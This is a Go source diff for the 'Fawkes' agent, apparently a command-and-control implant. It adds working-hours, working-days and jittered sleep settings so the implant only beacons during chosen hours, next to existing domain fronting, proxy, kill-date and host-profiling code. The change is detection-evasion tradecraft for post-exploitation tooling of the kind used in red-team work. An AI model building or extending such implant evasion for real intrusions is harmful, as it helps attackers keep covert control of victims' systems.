@@ -40,9 +40,12 @@ var (
 	debug         string = "false"
 	getURI        string = "/data"
 	postURI       string = "/data"
-	hostHeader    string = ""    // Override Host header for domain fronting
-	proxyURL      string = ""    // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
-	tlsVerify     string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
+	hostHeader        string = ""     // Override Host header for domain fronting
+	proxyURL          string = ""     // HTTP/SOCKS proxy URL (e.g., http://proxy:8080)
+	tlsVerify         string = "none" // TLS verification: none, system-ca, pinned:<fingerprint>
+	workingHoursStart string = ""     // Working hours start (HH:MM, 24hr local time)
+	workingHoursEnd   string = ""     // Working hours end (HH:MM, 24hr local time)
+	workingDays       string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
 )
 
 func main() {
@@ -99,22 +102,51 @@ func runAgent() {
 		os.Exit(0)
 	}
 
+	// Parse working hours configuration
+	whStartMinutes := 0
+	whEndMinutes := 0
+	var whDays []int
+	if workingHoursStart != "" {
+		if parsed, err := structs.ParseWorkingHoursTime(workingHoursStart); err != nil {
+			log.Printf("[WARNING] Invalid workingHoursStart %q: %v", workingHoursStart, err)
+		} else {
+			whStartMinutes = parsed
+		}
+	}
+	if workingHoursEnd != "" {
+		if parsed, err := structs.ParseWorkingHoursTime(workingHoursEnd); err != nil {
+			log.Printf("[WARNING] Invalid workingHoursEnd %q: %v", workingHoursEnd, err)
+		} else {
+			whEndMinutes = parsed
+		}
+	}
+	if workingDays != "" {
+		if parsed, err := structs.ParseWorkingDays(workingDays); err != nil {
+			log.Printf("[WARNING] Invalid workingDays %q: %v", workingDays, err)
+		} else {
+			whDays = parsed
+		}
+	}
+
 	// Initialize the agent
 	agent := &structs.Agent{
-		PayloadUUID:   payloadUUID,
-		Architecture:  runtime.GOARCH,
-		Domain:        "",
-		ExternalIP:    "",
-		Host:          getHostname(),
-		Integrity:     getIntegrityLevel(),
-		InternalIP:    getInternalIP(),
-		OS:            getOperatingSystem(),
-		PID:           os.Getpid(),
-		ProcessName:   os.Args[0],
-		SleepInterval: sleepIntervalInt,
-		Jitter:        jitterInt,
-		User:          getUsername(),
-		Description:   fmt.Sprintf("Fawkes agent %s", payloadUUID[:8]),
+		PayloadUUID:       payloadUUID,
+		Architecture:      runtime.GOARCH,
+		Domain:            "",
+		ExternalIP:        "",
+		Host:              getHostname(),
+		Integrity:         getIntegrityLevel(),
+		InternalIP:        getInternalIP(),
+		OS:                getOperatingSystem(),
+		PID:               os.Getpid(),
+		ProcessName:       os.Args[0],
+		SleepInterval:     sleepIntervalInt,
+		Jitter:            jitterInt,
+		User:              getUsername(),
+		Description:       fmt.Sprintf("Fawkes agent %s", payloadUUID[:8]),
+		WorkingHoursStart: whStartMinutes,
+		WorkingHoursEnd:   whEndMinutes,
+		WorkingDays:       whDays,
 	}
 
 	// Initialize HTTP profile
@@ -197,6 +229,20 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 				log.Printf("[INFO] Kill date reached, exiting")
 				return
 			}
+
+			// Enforce working hours — sleep until next working period if outside hours
+			if agent.WorkingHoursEnabled() && !agent.IsWithinWorkingHours(time.Now()) {
+				waitMinutes := agent.MinutesUntilWorkingHours(time.Now())
+				if waitMinutes > 0 {
+					// Add jitter to the wake time (±jitter% of sleep interval, not the full wait)
+					jitterSeconds := calculateSleepTime(agent.SleepInterval, agent.Jitter) - time.Duration(agent.SleepInterval)*time.Second
+					sleepDuration := time.Duration(waitMinutes)*time.Minute + jitterSeconds
+					log.Printf("[INFO] Outside working hours, sleeping %v until next work period", sleepDuration)
+					time.Sleep(sleepDuration)
+					continue
+				}
+			}
+
 			// Drain any pending outbound SOCKS data to include in this poll
 			outboundSocks := socksManager.DrainOutbound()
 
